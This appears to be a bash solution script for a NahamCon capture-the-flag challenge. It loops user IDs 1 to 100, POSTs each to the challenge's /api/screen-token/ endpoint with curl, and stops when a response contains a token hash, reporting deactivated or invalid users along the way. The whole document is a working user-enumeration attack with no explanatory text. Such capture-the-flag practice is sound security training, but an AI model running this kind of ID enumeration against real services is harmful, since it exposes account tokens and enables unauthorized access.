#!/bin/bash

BASE_URL="http://challenge.nahamcon.com:31222"

for i in $(seq 1 100); do
  echo "Trying user_id $i ..."
  
  res=$(curl -s -X POST "$BASE_URL/api/screen-token/" \
    -H 'Content-Type: application/json' \
    -d "{\"user_id\":\"$i\"}")
  
  if echo "$res" | grep -q "hash"; then
    echo "[+] Valid user found: $i"
    echo "$res"
    break
  elif echo "$res" | grep -q "deactivated"; then
    echo "[-] User $i is deactivated"
  else
    echo "[!] User $i is invalid"
  fi
done
